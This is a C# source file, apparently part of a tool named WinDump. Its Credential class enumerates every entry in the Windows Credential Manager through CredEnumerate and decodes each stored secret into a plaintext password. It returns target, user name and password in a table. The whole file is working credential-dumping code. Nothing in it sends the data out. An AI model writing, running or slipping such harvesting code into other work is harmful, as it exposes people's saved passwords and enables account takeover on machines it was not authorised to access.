using System;
using System.Collections.Generic;
using System.Data;
using System.IO;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Cryptography;
using System.Text;

namespace WinDump
{
    internal class Credential
    {
        internal static DataTable GetCred()
        {
            var dt = new DataTable();
            dt.Columns.Add("Target");
            dt.Columns.Add("User");
            dt.Columns.Add("Pwd");
            if (CredEnumerate(null, 1, out int count, out IntPtr pCredentials))
            {
                for (int i = 0; i < count; i++)
                {
                    IntPtr credential = Marshal.ReadIntPtr(pCredentials, i * IntPtr.Size);
                    if (credential != IntPtr.Zero)
                    {
                        CREDENTIAL cred = (CREDENTIAL)Marshal.PtrToStructure(credential, typeof(CREDENTIAL));

                        string targetName = cred.TargetName;
                        string userName = cred.UserName;
                        string password = string.Empty;

                        if (cred.CredentialBlob != IntPtr.Zero && cred.CredentialBlobSize > 0)
                        {
                            byte[] passwordBytes = new byte[cred.CredentialBlobSize];
                            Marshal.Copy(cred.CredentialBlob, passwordBytes, 0, (int)cred.CredentialBlobSize);
                            if (LooksLikeUTF16LE(passwordBytes))
                            {
                                password = Encoding.Unicode.GetString(passwordBytes);
                            }
                            else
                            {

                                password = Encoding.UTF8.GetString(passwordBytes);
                            }
                        }

                        dt.Rows.Add(targetName, userName, password);
                    }
                }

                CredFree(pCredentials);
            }

            return dt;
        }
        internal static bool LooksLikeUTF16LE(byte[] data)
        {
            int zeros = 0;
            for (int i = 1; i < data.Length; i += 2)
            {
                if (data[i] == 0x00)
                    zeros++;
            }

            float ratio = (float)zeros / (data.Length / 2);
            return ratio >= 0.5; // 超过一半的高位是0，可能是UTF-16LE编码
        }
        private enum CredentialType : uint
        {
            Generic = 1,
            DomainPassword,
            DomainCertificate,
            DomainVisiblePassword,
            GenericCertificate,
            DomainExtended,
            Maximum,
            MaximumEx = Maximum + 1000,
        }
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct CREDENTIAL
        {
            public uint Flags;
            public CredentialType Type;
            [MarshalAs(UnmanagedType.LPWStr)]
            public string TargetName;
            [MarshalAs(UnmanagedType.LPWStr)]
            public string Comment;
            public System.Runtime.InteropServices.ComTypes.FILETIME LastWritten;
            public uint CredentialBlobSize;
            public IntPtr CredentialBlob;
            public uint Persist;
            public uint AttributeCount;
            public IntPtr Attributes;
            public IntPtr TargetAlias;
            [MarshalAs(UnmanagedType.LPWStr)]
            public string UserName;
        }

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern bool CredEnumerate(string filter, int flag, out int count, out IntPtr pCredentials);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern void CredFree(IntPtr cred);


    }

}
